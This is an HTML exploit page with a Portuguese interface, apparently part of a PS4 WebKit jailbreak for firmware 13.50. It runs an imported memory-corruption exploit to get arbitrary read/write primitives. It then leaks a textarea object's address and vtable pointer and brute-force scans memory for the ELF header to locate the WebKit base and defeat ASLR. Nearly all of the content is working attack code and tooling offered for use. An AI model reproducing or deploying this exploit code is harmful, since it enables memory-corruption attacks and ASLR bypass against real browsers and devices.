
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>PS4 WebKit — Base Finder (Crash-Safe)</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; background: #0b0f19; color: #c8ced8;
    font: 13px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column; align-items: center;
    gap: 8px; padding: 10px; }
  h1 { color: #fff; font-size: 15px; text-align: center; }
  #status { font-size: 13px; font-weight: 700; color: #fff; text-align: center; }
  .panel { background: #111827; border: 1px solid #1f2937; border-radius: 8px;
    padding: 10px; width: 95%; max-width: 720px; }
  .row { display: flex; justify-content: space-between; padding: 2px 0;
    font-family: monospace; font-size: 11px; border-bottom: 1px solid #1f2937; }
  .row:last-child { border-bottom: none; }
  .label { color: #9ca3af; } .value { color: #60a5fa; font-weight: bold; }
  .value.good { color: #4ade80; } .value.bad { color: #f87171; }
  #log { width: 95%; max-width: 720px; height: 220px; background: #111827;
    border: 1px solid #1f2937; border-radius: 8px; padding: 6px;
    overflow-y: auto; font-family: monospace; font-size: 10px; color: #9fb1c3; }
  #log .ok { color: #4ade80; } #log .err { color: #f87171; }
  #log .found { color: #a78bfa; font-weight: bold; }
  #log .warn { color: #fbbf24; }
  .ctrl-btn { padding: 8px 12px; border-radius: 6px; border: none;
    background: #1e40af; color: #fff; cursor: pointer; font-size: 11px; font-weight: 600; }
  .ctrl-btn:hover { background: #2563eb; }
  .ctrl-btn:disabled { background: #374151; opacity: 0.4; cursor: not-allowed; }
  .ctrl-btn.success { background: #15803d; }
  .ctrl-btn.gold { background: #b45309; }
  .ctrl-btn.danger { background: #991b1b; }
  .section { color: #9ca3af; font-size: 9px; text-transform: uppercase; margin: 3px 0 2px; }
  .hint { color: #6b7280; font-size: 10px; text-align: center; max-width: 720px; }
  input[type="text"] {
    background: #1f2937; border: 1px solid #374151; color: #fff;
    border-radius: 4px; padding: 5px 6px; font-family: monospace; font-size: 11px;
    width: 110px;
  }
  .flex-row { display: flex; gap: 6px; flex-wrap: wrap; justify-content: center; align-items: center; }
  .progress { color: #fbbf24; font-size: 10px; }
</style>
</head>
<body>
<h1>PS4 WebKit — Base Finder (Crash-Safe)</h1>
<div id="status">Inicializando...</div>

<div class="section">Valores do Exploit</div>
<div class="panel" id="leaks">
  <div class="row"><span class="label">__ps5NativeCtor:</span><span class="value" id="l-ctor">---</span></div>
  <div class="row"><span class="label">vtable ptr (offset 0x10):</span><span class="value" id="l-vt">---</span></div>
  <div class="row"><span class="label">vtable[0]:</span><span class="value" id="l-vt0">---</span></div>
  <div class="row"><span class="label">Base:</span><span class="value" id="l-base">---</span></div>
</div>

<div class="hint">
  <b>PS4 13.50:</b> vtable em offset <b>0x10</b>.<br>
  Brute forces limitados a 64MB para evitar crash em memoria nao-mapeada.
</div>

<div class="section">Acoes</div>
<div class="flex-row">
  <button class="ctrl-btn success" id="btn-scan" onclick="scanVtable()">🔎 Ler VTable</button>
  <button class="ctrl-btn gold" id="btn-bf-ctor" onclick="bruteForceCtor()">💥 BF Ctor (64MB)</button>
  <button class="ctrl-btn danger" id="btn-bf-vt" onclick="bruteForceVtable()">💥 BF VTable (64MB)</button>
  <button class="ctrl-btn" id="btn-smart" onclick="smartScan()">🧠 Smart Boundary</button>
  <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar</button>
</div>

<div class="section">Offset Customizado</div>
<div class="flex-row">
  <input type="text" id="custom-off" placeholder="0x3A888" value="0x3A888">
  <button class="ctrl-btn" onclick="testCustomOffset()">Testar</button>
</div>

<div id="log"></div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const logBox = document.getElementById("log");
  const status = document.getElementById("status");
  function log(msg, cls) {
    const line = document.createElement("div");
    line.className = cls || "info";
    line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
    while (logBox.children.length > 80) logBox.removeChild(logBox.firstChild);
  }
  window.clearLog = function() { logBox.innerHTML = ""; log("Log limpo."); };

  let ctorInt64 = null;
  let vtablePtr = null;
  let vtable0 = null;
  let running = false;

  function setRunning(v) {
    running = v;
    document.querySelectorAll('.ctrl-btn').forEach(b => {
      if (!b.onclick || b.onclick.name === '') return;
      b.disabled = v;
    });
  }

  function numToInt64(num) {
    const low  = (num % 0x100000000) >>> 0;
    const hi   = (Math.floor(num / 0x100000000)) >>> 0;
    return new int64(low, hi);
  }

  function align16k(addr) {
    return addr.and64(0xFFFFC000, 0xFFFFFFFF);
  }

  function int64ToNum(addr) {
    return addr.hi * 0x100000000 + addr.low;
  }

  function isValidPtr(addr) {
    const n = int64ToNum(addr);
    return n >= 0x800000000 && n < 0x900000000;
  }

  // ============================================================
  // SAFE READ — try-catch em TUDO, retorna null se falhar
  // ============================================================
  function safeRead4(p, addr) {
    try {
      if (!isValidPtr(addr)) return null;
      return p.read4(addr);
    } catch (e) {
      return null;
    }
  }

  function safeRead8(p, addr) {
    try {
      if (!isValidPtr(addr)) return null;
      return p.read8(addr);
    } catch (e) {
      return null;
    }
  }

  // ============================================================
  // TESTAR BASE
  // ============================================================
  async function testBase(addr, label) {
    const p = window.p;
    if (!p) { log("window.p nao disponivel!", "err"); return false; }
    log("=== " + label + " => 0x" + addr.toString(16) + " ===", "warn");
    const magic = safeRead4(p, addr);
    if (magic === null) {
      log("  read falhou (nao-mapeado)", "err");
      return false;
    }
    const magicU = magic >>> 0;
    const magicHex = "0x" + magicU.toString(16).padStart(8, "0");
    log("  Magic: " + magicHex, magicU === 0x464c457f ? "found" : "info");
    if (magicU === 0x464c457f) {
      log("  ✅ BASE ENCONTRADA!", "found");
      window.__webkitBase = addr;
      document.getElementById("l-base").textContent = "0x" + addr.toString(16);
      status.textContent = "BASE: 0x" + addr.toString(16);
      status.style.color = "#4ade80";
      return true;
    }
    return false;
  }

  // ============================================================
  // LER VTABLE
  // ============================================================
  window.scanVtable = async function() {
    const p = window.p;
    if (!p) { log("window.p nao disponivel!", "err"); return; }
    log("=== Lendo vtable ===", "warn");

    const textArea = document.createElement("textarea");
    const objAddr = p.leakval(textArea);
    log("textarea obj @ 0x" + objAddr.toString(16), "ok");

    const vtPtr = safeRead8(p, objAddr.add32(0x10));
    if (!vtPtr) { log("Falha ao ler vtable ptr em 0x10", "err"); return; }
    vtablePtr = vtPtr;
    document.getElementById("l-vt").textContent = "0x" + vtPtr.toString(16);
    log("vtable ptr = 0x" + vtPtr.toString(16), "ok");

    const v0 = safeRead8(p, vtPtr);
    if (!v0) { log("Falha ao ler vtable[0]", "err"); return; }
    vtable0 = v0;
    document.getElementById("l-vt0").textContent = "0x" + v0.toString(16);
    log("vtable[0] = 0x" + v0.toString(16), "ok");

    // Ler mais slots
    for (let i = 1; i < 8; i++) {
      const slot = safeRead8(p, vtPtr.add32(i * 8));
      if (slot && isValidPtr(slot)) {
        log("  vtable[" + i + "] = 0x" + slot.toString(16), "ok");
      }
    }
  };

  // ============================================================
  // BRUTE FORCE A PARTIR DO CTOR (max 64MB, 16KB steps)
  // ============================================================
  window.bruteForceCtor = async function() {
    if (running) return;
    const p = window.p;
    if (!p || !ctorInt64) { log("Ctor nao disponivel", "err"); return; }
    setRunning(true);

    log("=== BF Ctor (max 64MB) ===", "warn");
    log("Ctor = 0x" + ctorInt64.toString(16), "info");

    const step = 0x4000; // 16KB
    const maxDist = 0x4000000; // 64MB
    let current = align16k(ctorInt64);
    const end = ctorInt64.sub32(maxDist);
    let tested = 0;

    try {
      for (;;) {
        if (current.hi < end.hi || (current.hi === end.hi && current.low < end.low)) {
          log("Limite de 64MB atingido.", "err");
          break;
        }

        const magic = safeRead4(p, current);
        if (magic !== null && (magic >>> 0) === 0x464c457f) {
          log("✅ BASE ENCONTRADA! 0x" + current.toString(16), "found");
          window.__webkitBase = current;
          document.getElementById("l-base").textContent = "0x" + current.toString(16);
          status.textContent = "BASE: 0x" + current.toString(16);
          status.style.color = "#4ade80";
          const off = int64ToNum(ctorInt64) - int64ToNum(current);
          log("Offset do ctor = 0x" + off.toString(16) + " (" + off + ")", "found");
          setRunning(false);
          return;
        }

        tested++;
        current = current.sub32(step);

        if (tested % 128 === 0) {
          log("Prog: " + tested + " blocos, 0x" + current.toString(16), "info");
          await new Promise(r => setTimeout(r, 5));
        }
      }
    } catch (e) {
      log("Exception no loop: " + e.message, "err");
    }
    log("BF Ctor terminou sem sucesso.", "err");
    setRunning(false);
  };

  // ============================================================
  // BRUTE FORCE A PARTIR DO VTABLE (max 64MB, 16KB steps)
  // ============================================================
  window.bruteForceVtable = async function() {
    if (running) return;
    const p = window.p;
    if (!p || !vtablePtr) {
      log("vtable ptr nao disponivel. Clique 'Ler VTable' primeiro.", "err");
      return;
    }
    setRunning(true);

    log("=== BF VTable (max 64MB) ===", "warn");
    log("vtable ptr = 0x" + vtablePtr.toString(16), "info");

    const step = 0x4000;
    const maxDist = 0x4000000; // 64MB
    let current = align16k(vtablePtr);
    const end = vtablePtr.sub32(maxDist);
    let tested = 0;

    try {
      for (;;) {
        if (current.hi < end.hi || (current.hi === end.hi && current.low < end.low)) {
          log("Limite de 64MB atingido.", "err");
          break;
        }

        const magic = safeRead4(p, current);
        if (magic !== null && (magic >>> 0) === 0x464c457f) {
          log("✅ BASE ENCONTRADA! 0x" + current.toString(16), "found");
          window.__webkitBase = current;
          document.getElementById("l-base").textContent = "0x" + current.toString(16);
          status.textContent = "BASE: 0x" + current.toString(16);
          status.style.color = "#4ade80";
          const off = int64ToNum(vtablePtr) - int64ToNum(current);
          log("Offset do vtable ptr = 0x" + off.toString(16) + " (" + off + ")", "found");
          setRunning(false);
          return;
        }

        tested++;
        current = current.sub32(step);

        if (tested % 128 === 0) {
          log("Prog: " + tested + " blocos, 0x" + current.toString(16), "info");
          await new Promise(r => setTimeout(r, 5));
        }
      }
    } catch (e) {
      log("Exception no loop: " + e.message, "err");
    }
    log("BF VTable terminou sem sucesso.", "err");
    setRunning(false);
  };

  // ============================================================
  // SMART BOUNDARY SCAN
  // Encontra o limite entre memoria mapeada e nao-mapeada
  // ============================================================
  window.smartScan = async function() {
    if (running) return;
    const p = window.p;
    if (!p || !vtablePtr) {
      log("vtable ptr nao disponivel. Clique 'Ler VTable' primeiro.", "err");
      return;
    }
    setRunning(true);

    log("=== Smart Boundary Scan ===", "warn");
    log("Procurando limite do modulo a partir do vtable ptr...", "info");

    // Passo 1: encontrar o primeiro endereco NAO-legivel indo para tras
    // Comeca do vtable ptr e desce em passos de 1MB
    const mbStep = 0x100000;
    const maxSearch = 0x8000000; // 128MB max
    let boundaryHigh = vtablePtr;
    let boundaryLow = vtablePtr.sub32(maxSearch);

    // Busca grossa: encontrar onde a memoria deixa de ser legivel
    let probe = align16k(vtablePtr);
    let lastReadable = null;
    let firstUnreadable = null;

    try {
      for (let dist = 0; dist < maxSearch; dist += mbStep) {
        const addr = vtablePtr.sub32(dist);
        const aligned = align16k(addr);
        const val = safeRead4(p, aligned);

        if (val !== null) {
          lastReadable = aligned;
          log("  Legivel @ 0x" + aligned.toString(16) + " (dist -" + (dist/0x100000) + "MB)", "ok");
        } else {
          firstUnreadable = aligned;
          log("  NAO-legivel @ 0x" + aligned.toString(16) + " (dist -" + (dist/0x100000) + "MB)", "err");
          break;
        }
        if (dist % (mbStep * 4) === 0) await new Promise(r => setTimeout(r, 10));
      }

      if (!lastReadable) {
        log("Nenhum endereco legivel encontrado!", "err");
        setRunning(false);
        return;
      }

      if (!firstUnreadable) {
        log("Memoria legivel ate 128MB. Modulo muito grande ou nao encontramos o limite.", "warn");
        firstUnreadable = vtablePtr.sub32(maxSearch);
      }

      log("Limite entre 0x" + lastReadable.toString(16) + " e 0x" + firstUnreadable.toString(16), "warn");

      // Passo 2: busca fina de 16KB entre lastReadable e firstUnreadable
      log("Buscando ELF header na faixa de 16KB...", "info");
      let scan = lastReadable;
      const stop = firstUnreadable;

      for (;;) {
        if (scan.hi < stop.hi || (scan.hi === stop.hi && scan.low < stop.low)) {
          break;
        }

        const magic = safeRead4(p, scan);
        if (magic !== null && (magic >>> 0) === 0x464c457f) {
          log("✅ BASE ENCONTRADA! 0x" + scan.toString(16), "found");
          window.__webkitBase = scan;
          document.getElementById("l-base").textContent = "0x" + scan.toString(16);
          status.textContent = "BASE: 0x" + scan.toString(16);
          status.style.color = "#4ade80";
          const off = int64ToNum(vtablePtr) - int64ToNum(scan);
          log("Offset do vtable ptr = 0x" + off.toString(16), "found");
          setRunning(false);
          return;
        }

        scan = scan.sub32(0x4000);

        // Contagem de progresso a cada 1MB
        const distSoFar = int64ToNum(vtablePtr) - int64ToNum(scan);
        if (distSoFar % 0x100000 < 0x4001) {
          log("  Scan fino: 0x" + scan.toString(16), "info");
          await new Promise(r => setTimeout(r, 5));
        }
      }
    } catch (e) {
      log("Exception: " + e.message, "err");
    }

    log("Smart scan terminou sem encontrar base.", "err");
    setRunning(false);
  };

  // ============================================================
  // TESTAR OFFSET CUSTOMIZADO
  // ============================================================
  window.testCustomOffset = async function() {
    const p = window.p;
    if (!p || !ctorInt64) { log("Primitivas nao prontas", "err"); return; }
    const raw = document.getElementById("custom-off").value;
    const off = parseInt(raw, 16);
    if (isNaN(off)) { log("Offset invalido: " + raw, "err"); return; }

    const base = align16k(ctorInt64.sub32(off));
    log("Offset: 0x" + off.toString(16) + " => base 0x" + base.toString(16), "warn");
    const found = await testBase(base, "Custom-0x" + off.toString(16));
    if (found) {
      const actualOff = int64ToNum(ctorInt64) - int64ToNum(base);
      log("Offset real do ctor = 0x" + actualOff.toString(16), "found");
    }
  };

  // ============================================================
  // BOOTSTRAP
  // ============================================================
  log("Carregando...", "ok");
  status.textContent = "Executando exploit...";
  establishPrimitive({ onEvent: (tag, detail) => log(tag + ": " + detail, "info") })
    .then(carrier => {
      const prim = installWindowP(carrier, { onEvent: (tag, detail) => log(tag + ": " + detail, "info"), promote: true });
      window.__carrier = carrier; window.__prim = prim; window.p = prim; window.int64 = int64;
      log("Exploit pronto!", "ok");

      const ctor = globalThis.__ps5NativeCtor;
      if (typeof ctor === "number") {
        ctorInt64 = numToInt64(ctor);
        document.getElementById("l-ctor").textContent = "0x" + ctorInt64.toString(16);
        log("__ps5NativeCtor = 0x" + ctorInt64.toString(16), "ok");
      }

      status.textContent = "Pronto — clique em 'Ler VTable' primeiro";
      status.style.color = "#60a5fa";
    })
    .catch(err => { log("FALHA: " + err.name + ": " + err.message, "err"); status.textContent = "Falha"; status.style.color = "#f87171"; });
</script>
</body>
</html>
